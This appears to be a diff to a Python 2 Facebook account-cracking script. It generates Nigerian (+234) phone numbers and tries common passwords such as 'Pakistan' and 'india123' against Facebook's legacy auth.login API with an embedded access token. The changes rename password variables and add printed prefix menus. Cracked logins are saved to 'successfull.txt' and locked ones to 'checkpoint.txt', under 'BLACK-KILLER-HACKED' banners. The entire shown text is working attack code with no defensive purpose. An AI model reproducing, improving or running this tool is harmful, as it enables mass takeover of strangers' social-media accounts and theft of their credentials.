@@ -531,7 +531,9 @@ def action():
                 os.system("clear")
                 print (logo)
                 print "\033[1;91mENTER THE CODE HERE"
-
+                print "\033[1;95m82, 83, 84, 85, 86, 87, 88, 89"
+                print "\033[1;94m31, 33, 34, 35, 36, 37, 38, 39"
+                print "\033[1;94m41, 42, 43, 44, 45, 46, 47, 48"
                 try:
                         c = raw_input(" SELECTED CODE: ")
                         k="+234"
@@ -653,56 +655,56 @@ def action():
                                                                                         cps.close()
                                                                                         cpb.append(c+user+pass4)
                                                                                 else:
-                                                                                        pass4 = c
-                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                                        pass5 = c
+                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                         q = json.load(data)
                                                                                         if 'access_token' in q:
-                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                                                                 okb = open('save/successfull.txt', 'a')
-                                                                                                okb.write(k+c+user+'|'+pass4+'\n')
+                                                                                                okb.write(k+c+user+'|'+pass5+'\n')
                                                                                                 okb.close()
-                                                                                                oks.append(c+user+pass4)
+                                                                                                oks.append(c+user+pass5)
                                                                                         else:
                                                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                                                                         cps = open('save/checkpoint.txt', 'a')
-                                                                                                        cps.write(k+c+user+'|'+pass4+'\n')
+                                                                                                        cps.write(k+c+user+'|'+pass5+'\n')
                                                                                                         cps.close()
-                                                                                                        cpb.append(c+user+pass4)
+                                                                                                        cpb.append(c+user+pass5)
                                                                                                 else:
-                                                                                                        pass4 = 'Pakistan'
-                                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                                                        pass6 = 'Pakistan'
+                                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                         q = json.load(data)
                                                                                                         if 'access_token' in q:
-                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
                                                                                                                 okb = open('save/successfull.txt', 'a')
-                                                                                                                okb.write(k+c+user+'|'+pass4+'\n')
+                                                                                                                okb.write(k+c+user+'|'+pass6+'\n')
                                                                                                                 okb.close()
-                                                                                                                oks.append(c+user+pass4)
+                                                                                                                oks.append(c+user+pass6)
                                                                                                         else:
                                                                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
                                                                                                                         cps = open('save/checkpoint.txt', 'a')
-                                                                                                                        cps.write(k+c+user+'|'+pass4+'\n')
+                                                                                                                        cps.write(k+c+user+'|'+pass6+'\n')
                                                                                                                         cps.close()
-                                                                                                                        cpb.append(c+user+pass4)
+                                                                                                                        cpb.append(c+user+pass6)
                                                                                                                  else:
-                                                                                                                        pass4 = 'india123'
-                                                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                                                                        pass7 = 'india123'
+                                                                                                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                         q = json.load(data)
                                                                                                                         if 'access_token' in q:
-                                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
                                                                                                                                 okb = open('save/successfull.txt', 'a')
-                                                                                                                                okb.write(k+c+user+'|'+pass4+'\n')
+                                                                                                                                okb.write(k+c+user+'|'+pass7+'\n')
                                                                                                                                 okb.close()
-                                                                                                                                oks.append(c+user+pass4)
+                                                                                                                                oks.append(c+user+pass7)
                                                                                                                         else:
                                                                                                                                 if 'www.facebook.com' in q['error_msg']:
-                                                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                                                                        print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
                                                                                                                                         cps = open('save/checkpoint.txt', 'a')
-                                                                                                                                        cps.write(k+c+user+'|'+pass4+'\n')
+                                                                                                                                        cps.write(k+c+user+'|'+pass7+'\n')
                                                                                                                                         cps.close()
-                                                                                                                                        cpb.append(c+user+pass4)
+                                                                                                                                        cpb.append(c+user+pass7)
                                                                                                                                 else:
                                                                                                                                         pass8 = '786786786'
                                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
